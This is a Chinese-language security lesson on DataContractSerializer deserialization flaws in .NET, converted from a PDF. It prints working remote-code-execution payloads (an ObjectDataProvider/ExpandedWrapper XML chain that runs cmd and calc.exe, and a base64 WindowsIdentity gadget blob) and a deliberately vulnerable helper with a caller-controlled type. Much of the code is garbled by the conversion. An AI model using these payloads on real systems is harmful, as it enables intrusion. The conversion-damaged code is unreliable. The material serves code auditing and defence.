<!--
Source: G:\tmp\安全项目研究\.netskill\.NET高级代码审计（第六课） DataContractSerializer反序列化漏洞.pdf-bcfd8217-e805-4224-87f0-5d273b5ec8d1\full.md
Archived as: DataContractSerializer raw lesson material
Purpose: provenance-only reference for authorized .NET code audit skill development.
Do not load by default; prefer structured references unless exact source context is needed.
-->
.NET 高级代码审计（第六课） DataContractSerializer 反序列化漏洞

Ivan1ee@360 天眼云影实验室

2019 年 03 月 01 日

# 0X00 前言

DataContractSerializer 类用于序列化和反序列化 Windows Communication

Foundation (WCF) 消息中发送的数据，用于把 CLR 数据类型序列化成 XML 流，它

位于命名空间 System.Runtime.Serialization，继承于

System.Runtime.Serialization.XmlObjectSerializer，在某些场景下开发者使用

DataContractSerializer.ReadObject 读取了恶意的 XML 数据就会造成反序列化漏洞，

从而实现远程 RCE 攻击，本文笔者从原理和代码审计的视角做了相关介绍和复现。

# 0X01 DataContractSerializer 序列化

类名使用 DataContractAttribute 标记，类成员使用 DataMemberAttribute 标记，

可指定要序列化的属性和字段，下面先来看这个系列课程中经典的一段代码

[DataContract]   
public class TestClass{ private string classname; private string name; private int age; [DataMember] public string classname { get $\Rightarrow$ classname; set $\Rightarrow$ classname $=$ value;} [DataMember] public string Name { get $\Rightarrow$ name; set $\Rightarrow$ name $=$ value;} [DataMember] public int Age { get $\Rightarrow$ age; set $\Rightarrow$ age $=$ value;} public override stringToString() { return base.ToString(); } public static void ClassMethod( string value) { Process.Start(value); }

TestClass 对象定义了三个成员，并实现了一个静态方法 ClassMethod 启动进程。 序

列化通过创建对象实例分别给成员赋值

```cs
TestClass testClass = new TestClass();
testClass.Name = "Ivan1ee";
testClass.Age = 18;
testClass.Classname = "360";
using (MemoryStream stream = new MemoryStream())
{
    DataContractSerializer jsonSerializer = new DataContractSerializer(testClass.Type());
    jsonSerializer.WriteObject(stream, testClass);
    string strContent = Encoding.Utf8.GetString(stream.toArray());
    Console.WriteLine(strContent);
} 
```

使用 DataContractSerializer.WriteObject 非常方便的实现.NET 对象与 XML 数据之间

的转化，笔者定义 TestClass 对象，常规下使用 WriteObject 得到序列化后的 XML 数据

```xml
<TestClass xmlns="http://schemas.datacontract.org/2004/07/WpfApp1" xmlns:i="http://www.w3.org/2001/XMLSchema-instance"><Age>18</Age><ClassName>360</ClassName><Name>Ivan1ee</Name></TestClass> 
```

# 0x02 DataContractSerializer 反序列化

# 2.1、反序列化原理和用法

反序列过程是将 XML 流或者数据转换为对象，在 DataContractSerializer 类中创建对

象然后调用 ReadObject 方法实现的

```txt
public override bool IsStartObject(XmLReader reader);   
public override bool IsStartObject(XmLDictionaryReader reader);   
public override object ReadObject(XmLReader reader);   
public override object ReadObject(XmLReader reader, bool verifyobjectName);   
public override object ReadObject(XmLDictionaryReader reader, bool verifyobjectName);   
public object ReadObject(XmLDictionaryReader reader, bool verifyobjectName, DataContractResolver dataContractResolver);   
public override void WriteEndObject(XmLDictionaryWriter writer);   
public override void WriteEndObject(XmLWriter writer);   
public void WriteObject(XmLDictionaryWriter writer, object graph, DataContractResolver dataContractResolver);   
public override void WriteObject(XmLWriter writer, object graph);   
public override void WriteObjectContent(XmLWriter writer, object graph);   
public override void WriteObjectContent(XmLDictionaryWriter writer, object graph);   
public override void WriteStartObject(XmLDictionaryWriter writer, object graph);   
public override void WriteStartObject(XmLWriter writer, object graph); 
```

首先看 DataContractSerializer 类的定义，创建实例的时候会带入类型解析器

```txt
public sealed class DataContractSerializer : XmlObjectSerializer  
{  
    Typeotte;  
    DataContract rootContract; // post-surrogate  
    bool needsContractNsAtRoot;  
    XmlDictionaryString rootName;  
    XmlDictionary string rootNamespace;  
    int maxItemsInObjectGraph;  
    bool ignoreExtensionDataobject;  
    bool preserveObjectReferences;  
    IDataContractSurrogate dataContractSurrogate;  
    ReadOnlyCollection<Type>knownTypeCollection;  
    internal IList<Type>knownTypeList;  
    internal DataContractDictionary knownDataContracts;  
    DataContractResolver dataContractResolver;  
    bool serializeReadOnlyTypes;  
public DataContractSerializer(Type type): this(type, (IEnumerable<Type>)null)  
{ 
```

然后在初始化方法 Initialize 里将 Type 类型解析器赋值给成员 rootType

```txt
void Initialize(Type type,   
IEnumerable不同类型,   
int maxItemsInObjectGraph,   
bool ignoreExtensionDataobject,   
bool preserveObjectReferences,   
IDataContractSurrogate dataContractSurrogate,   
DataContractResolver dataContractResolver,   
bool serializeReadOnlyTypes)   
{ CheckNull(type, "type"); this.rootType = type; if (knownTypes != null) { this.knownTypeList = new List不同类型(); foreach (Type knownType in knownTypes) { this.knownTypeList.Add(knownType); } } 
```

反序列化过程中使用 ReadObject 方法调用了 ReadObjectHandleExceptions 方法，省略一些非核心代码，进入 InternalReadObject 方法体内

```javascript
if (knownTypesAddedInCurrentScope) { object obj = ReadDataContractValue(dataContract, reader); scopedKnownTypes.Pop(); return obj; } else { return ReadDataContractValue(dataContract, reader); } 
```

ReadDataContractValue 方法体内返回用 ReadXmlValue 处理后的数据，

```txt
protected virtual object ReadDataContractValue(DataContract dataContract, XmlReaderDelegator reader)  
{ return dataContract.ReadXmlValuereader, this); } 
```

从下图可以看出这是一个 C#里的虚方法，在用

System.Runtime.Serialization.DiagnosticUtility 类处理数据的时候通过

DataContract.GetClrTypeFullName 得到 CLR 数据类型的全限定名。

```java
public virtual object ReadXmlValue(XmlReaderDelegator xmlReader, XmlObjectSerializerReadContext context)   
{ throw System.Runtime Serialization.DiagnosticUtility.Exception Utility.throwsError(new InvalidDataContractException(SR.getString(SR.UnexpectedContractType, DataContract.GetCl 
```

下图 Demo 展示了序列化和反序列化前后的效果  
```cs
TestClass testClass = new TestClass();
testClass.Name = "Ivan1ee";
testClass.Age = 18;
testClass.Classname = "360";
using (MemoryStream stream = new MemoryStream())
{
    DataContractSerializer jsonSerializer = new DataContractSerializer(testClassYPE());
    jsonSerializer.WriteObject(stream, testClass);
    string strContent = Encodingutf8.GetStringizensStream.toArray());
    Console.WriteLine(strContent);
    using (MemoryStream stream1 = new MemoryStreamEncodingutf8.getBytes(strContent)))
    {
        DataContractSerializer jsonSerializer1 = new DataContractSerializer(typeof(TestClass));
        TestClass obj = (TestClass)jsonSerializer1.ReadObject(stream1);
        Console.WriteLine(obj.Name);
        Console.ReadKey();
    }
} 
```

反序列化后得到对象的属性，打印输出成员 Name 的值。

![](images/e69c2a1ad8c447048a258d52e5de0190a8172bf81f58c5c3c5145633c89d4136.jpg)

DATmp\Csharp\WPFWpfApp1/WpfApp1\bin\Debug\WpfApp1.exe

```html
<TestClass xmlns="http://schemas.datacontract.org/2004/07/WpfApp1" name>Ivanlee</Name></TestClass> Ivanlee 
```

# 2.2、攻击向量—ObjectDataProvider

漏洞的触发点是在于初始化 DataContractSerializer 类实例时，参数类型解析器 type是否可控，也就是说攻击者需要控制重构对象的类型，若可控的情况下并且反序列化了恶意的 Xml 数据就可以触发反序列化漏洞。笔者继续选择 ObjectDataProvider 类方便调用任意被引用类中的方法，具体有关此类的用法可以看一下《.NET 高级代码审计

（第一课） XmlSerializer 反序列化漏洞》，因为 Process.Start 之前需要配置

ProcessStartInfo 类相关的属性，例如指定文件名、指定启动参数，所以首先考虑序列化 ProcessStartInfo 再来序列化 Process 类调用 StartInfo 启动程序，然后需要对其做减法，去掉无关的 System.RuntimeType、System.IntPtr 窗口句柄数据，下面是国外研究者提供的反序列化 Payload

<?xml version="1.0"?>   
<root xmlns:xi="http://www.w3.org/2001/XMLSchema-instance"   
xmlns:xsd="http://www.w3.org/2001/XMLSchema"   
type $=$ "System.Data.ServicesInternal.ExpandedWrapper'2[[System.Diagnostic   
s.Process, System, Version=4.0.0.0, Culture $\equiv$ neutral,   
PublicKeyToken $\equiv$ b77a5c561934e089],[System.Windows.Data.ObjectDataProvi   
der, PresentationFramework, Version=4.0.0.0, Culture $\equiv$ neutral,   
PublicKeyToken $\equiv$ 31bf3856ad364e35], System.Data.Services, Version=4.0.0.0,   
Culture $\equiv$ neutral, PublicKeyToken $\equiv$ b77a5c561934e089""> <ExpandedWrapperOfProcessObjectDataProviderpaO_SOqJL   
xmlns $=$ ""http://schemas.datacontract.org/2004/07/System.Data.Services.Inter   
nal""   
xmlns:i $=$ ""http://www.w3.org/2001/XMLSchema-instance""   
xmlns:z $=$ ""http://schemas.microsoft.com/2003/10/Localization/"> <ExpandedElement z:Id $=$ ""ref1""   
xmlns:a $=$ ""http://schemas.datacontract.org/2004/07/System.Diagnostics""> <_identity i:nil $=$ ""true""   
xmlns $=$ ""http://schemas.datacontract.org/2004/07/System"" /> </ExpandedElement>   
<ProjectedProperty0   
xmlns:a $=$ ""http://schemas.datacontract.org/2004/07/System.Windows.Data""   
> <a:MethodName>Start</a:MethodName> <a:MethodParameters   
xmlns:b $=$ ""http://schemas.microsoft.com/2003/10/Localization/Arrays""> <b:anyType i:type $=$ ""c:string""   
xmlns:c $=$ ""http://www.w3.org/2001/XMLSchema"">cmd</b:anyType> <b:anyType i:type $=$ ""c:string""   
xmlns:c $=$ ""http://www.w3.org/2001/XMLSchema""> /c calc.exe</b:anyType> </a:MethodParameters> <a:ObjectInstance z:Ref $=$ ""ref1""/> </ProjectedProperty0> </ExpandedWrapperOfProcessObjectDataProviderpaO_SOqJL>   
</root>

设计的 Demo 里使用 ReadObject(new XmlTextReader(new

StringReader(xmlItem.InnerXml)))反序列化成功弹出计算器。

```txt
string payload \(=\) \\("></xml version \(\coloneqq\) "1.0"\?)   
<root xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xd \(\coloneqq\) "http://www.w3.org/2001/XMLSchema" type \(\coloneqq\) "System.Data.ServicesInternal.Expanded   
\xmns=">http:// schemas.datacontract.org/2004/07/System.Data.Services/Internal"   
xmsn;i="http://www.w3.org/2001/XMLSchema-instance"   
xmsn;z="http:// schemas.microsoft.com/2003/10/Normalization/"   
<ExpandedElement z:Id="ref1" xmlns:a="http:// schemas.datacontract.org/2004/07/System.Diagnostics"   
<_identity i:nil="true" xmlns \(\coloneqq\) "http:// schemas.datacontract.org/2004/07/System"/>   
</ExpandedElement>   
<ProjectedProperty0 xmlns:a \(\coloneqq\) "http:// schemas.datacontract.org/2004/07/System.Windows.Data"/>   
<a:MethodName>start</a:MethodName>   
< a:MethodParameters xmlns:b \(\coloneqq\) "http:// schemas.microsoft.com/2003/10/Localization%/Arrays"/> <b:anyType i:type \(\coloneqq\) "c:string" xmlns:c \(\coloneqq\) "http://www.w3.org/2001/XMLSchema"cidc< b:anyType> <b:anyType i:type \(\coloneqq\) "c:string" xmlns:c \(\coloneqq\) "http://www.w3.org/2001/XMLSchema"cidcalc</b:anyType>   
</a:MethodParameters>   
< a:ObjectInstance z:Ref \(\coloneqq\) "ref1"/>   
</ProjectedProperty>   
</ExpandedWrapperOfProcessobjectDataProviderpaO_SOq]L>   
</root>;   
var xmlDoc = new XmlDocument();   
xmlDoc.loadXml(payload);   
XMLElement xmlItem = (xmlELEMENT)xmlDoc.SelectSingleNode("root");   
var s = new DataContractSerializer(Type不同类型+xmlItem_ATTRIBUTE("type"));   
var d = s.ReadObject(new XmlTextReader(new StringReader/xmlItem INNERXml)); 
```

```batch
C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe 
```

# 2.3、攻击向量—WindowsIdentity

第二种攻击方法使用 WindowsIdentity 类，这个类继承了 ClaimsIdentity，并且实现了 ISerializable 接口，实现这个接口好处是可以控制你想反序列化的数据类型，此外还可以避免用到反射机制从而提高了运行速度。具体有关此类的用法可以看一下《.NET高级代码审计（第二课） Json.Net 反序列化漏洞》，下面是国外研究者提供的反序列

```txt
<root xmlns:xsi="http://www.w3.org/2001/XMLSchemaSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchemaSchema" type="System.Security.Principal.WindowsIdentity, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"> <WindowsIdentity xmlns:i="http://www.w3.org/2001/XMLSchema-instance" xmlns:x="http://www.w3.org/2001/XMLSchema-instance" xmlns:dacontract.org/2004/07/System.Security.Principal"> <System.Security ClaimsIdentity/bootstrapsContext i:type="x:string" xmlns="">AAEAAAD///AQAAAAAAAAAAMAgAAAAIteXN0ZW0sIFZlcnNpb24 9NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzd hNWM1NjE5MzRIMDg5BQEAAACEAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5I cmljLINvcnRIZFNIdGAXW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc 2Lvbj00LjAuMC4wLCBDdWxOdXJIPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI 3N2E1YzU2MTkzNGUwODIdXQQAAAAFQ291bnQIQ29tcGFyZXIHVmVyc2Ivbg VJdGVtcwADAAYIjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYX Jpc29uQ29tcGFyZXJgMVtbU3IzdGVtLIN0cmluZywgbXNjb3JsaWIsIFZlcnNpb2 49NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzd dhNWM1NjE5MzRIMDg5XV0IAgAAAAIAAAAJAawAAAAIAAAAJBAAAAAQA DAA AJQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcG FyZXJgMVtbU3IzdGVtLIN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuM CwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5 MzRIMDg5XV0BAAAAC19jb21wYXJpc29uAyJExNXOZW0uRGVsZWdhdGVTZXJ pYWxpermF0aW9uSG9sZGVyCQUAAAARBAAAAAIAAAAGBgAAAAAsvYbjYWxj LmV4ZQYHAAAAA2NtZAQFAAAAIIIN5c3RlbS5EZWxlZ2F0ZVNlcmIhbGI6YXRp b25Ib2xkZXDIAAAACERlGbVnYXRIB21IdGhvZDAHbWV0aG9MQMDAzBTEXN 0ZW0uRGVsZWdhdGVTZXJpYWxpermF0aW9uSG9sZGVyK0RIbGVnYXRIRW50c nkvU3IzdGVtLIJIzmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGI6YXRpb25Ib2xk ZXIvU3IzdGVtLIJIzmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGI6YXRpb25Ib2x kZXIJCAAAAAKJAAAACQoAAAAECAAAADBTexNOZW0uRGVsZWdhdGVTZXJp YWxpermF0aW9uSG9sZGVyK0RIbGVnYXRIRW50cnkHAAAABHR5cGUIYXNZZW 1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlwbJseQ50XYJnZXRUExBITmFZQpt tZXRob2ROYW1IDWRIbGVnYXRIRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2 F0ZVNlcmIhbGI6YXRpb25Ib2xkZXIRRGVsZWdhdGVFbnRyeQYLAAAAAsAJTeXN 0ZW0uRnVuY2AzW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2IvbjO 
```

```html
0LjAuMC4wLCBDdWx0dXJIPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPW13N2E1 YzU2MTkzNGUwODlDfTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2I vbj00LjAuMC4wLCBDdWx0dXJIPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPW13 N2E1YzU2MTkzNGUwODlDfTeXN0ZW0uRGLhZ25vc3RpY3MuUHJvY2Vzcyw gU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgU HVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dBgwAAABLbXNjb3JsaW IsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZ XIUb2tlbj1iNzdhNWM1NjeE5MzRIMDg5CgYNAAAASVN5c3RlbSwgVmVyc2Ivbj 00LjAuMC4wLCBDdWx0dXJIPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPW13N2E 1YzU2MTkzNGUwODkGDgAAABpTeXN0ZW0uRGLhZ25vc3RpY3MuUHJvY2Vz cwYPAAAABVN0YXJ0CRAAAAAECQAAAC9TeXN0ZW0uUmVmbGVjdGlvbi5NZ W1izXXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlccgCAAAAETmFtZQxCb3NlbWJseU 5hbWUJQ2xhc3NOYW1ICVNpZ25hdHVyZQpTaWduYXR1cmUyCk1lbWJIclR5c GUQR2VuZXJpY0FyZ3VtZW50cwEBAQEBAAMIDVN5c3RlbS5UeXBIW10JDwAA AAKNAAAACQ4AAAAGFAAAAD5TeXN0ZW0uRGLhZ25vc3RpY3MuUHJvY2Vz cyBTdGFydChTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQYVAAAAPI N5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzIFN0YXJ0KFN5c3RlbS5TdHJpbmcsiFN5c3RlbS5TdHJpbmcpCAAAAAOBCgAAAAKAAAAGFgAAAAdDb21wYXJICQw AAAAGGAAAAA1TeXN0ZW0uU3RyaW5nBhkAAAArSW50MzIgQ29tcGFyZShTe XN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQYaAAAAMIN5c3RlbS5Jbn QzMiDBb21wYXJIKFN5c3RlbS5TdHJpbmcsiIFN5c3RlbS5TdHJpbmcpCAAAAAo BEAAAAAGAAAAGGwAAAHFTeXN0ZW0uQ29tcGFyaXNvbmAxW1tTeXN0ZW0 uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2Ivbj00LjauC4wLCBDdWxOdXJIPW5Id dXReYWwsIFB1YmxpY0tleVRva2VupWI3N2E1ZyU2MTkzNGUwODldXQkMAA AACgkMAAAACRgAAAAAJFgAAAAAoL</System.Security ClaimsIdentity.bootstra pContext> </WindowsIdentity> </root> 
```

将 Demo 中的变量替换掉后，在抛出异常之前成功触发计算器，效果如下图

![](images/08c3ef8c84e5430b26eb270d7163fcc6aca56238f3bc2cca24e86d24ae619855.jpg)

# 0x03 代码审计视角

# 3.1、ReadObject

从代码审计的角度很容易找到漏洞的 EntryPoint，通过前面几个小节的知识能发现需要满足一个类型解析器 type 可控，再传入 XML，就可以被反序列化，例如下面的DataContractSerializer 类

// <summary>   
///   
/// </summary>   
/// <param name $\equiv$ "data"></param>   
/// <param name $\equiv$ "type"></param>   
/// <returns></returns>   
public static Object DeserializationFromBase64StringByDataContractSerializer(String data, Type type)   
{ using (MemoryStream ms $=$ new MemoryStream()) { byte[] content $=$ Convert.FromBase64String(data); ms.Write(content, 0, content.Length); ms.Position $= 0$ var dataContractSerializer $=$ new DataContractSerializer(type); return dataContractSerializer.Readobject(ms); }   
}

# 0x04 案例复盘

1. 使用 ObjectDataProvider 攻击向量，输入 http://localhost:5651/Default Post加载 value 值

![](images/94fc709897178665f265b5762432baf84907e8df5a55aec0993e31dd34308af5.jpg)

2. 通过 ReadObject 反序列化 ，并弹出计算器，网页返回 200。

![](images/d76bdfe76995374fb2724eb579fc56b19b096e51bb00140ce1ae5c3523d5f9a8.jpg)

3. 使用 WindowsIdentity 攻击向量，输入 http://localhost:5651/Default Post 加载value值，弹出计算器的同时，服务也会挂掉。

![](images/2d5b9e2d9f7d7e0272270a1d5cbb4ce2d5d46bcec4931f353c9c4bf4659f2031.jpg)

# 最后附上动态效果图

![](images/3f3be4d46ff3d361509e7f83fbf74d6adf321089d8eabfcba4ed586c4f06a80c.jpg)

# 0x05 总结

DataContractSerializer 在实际开发中使用频率较高，但因 type 需可控才能实施攻击，所以攻击成本相对来说较高。最后.NET 反序列化系列课程笔者会同步到

https://github.com/Ivan1ee/ 、https://ivan1ee.gitbook.io/ ，后续笔者将陆续推出高质量的.NET反序列化漏洞文章，欢迎大伙持续关注，交流，更多的.NET安全和技巧可关注实验室公众号。

![](images/8e3813a8231ec34fecfd2606f13e77756567adf8f64cbd5d398d845854d5a887.jpg)
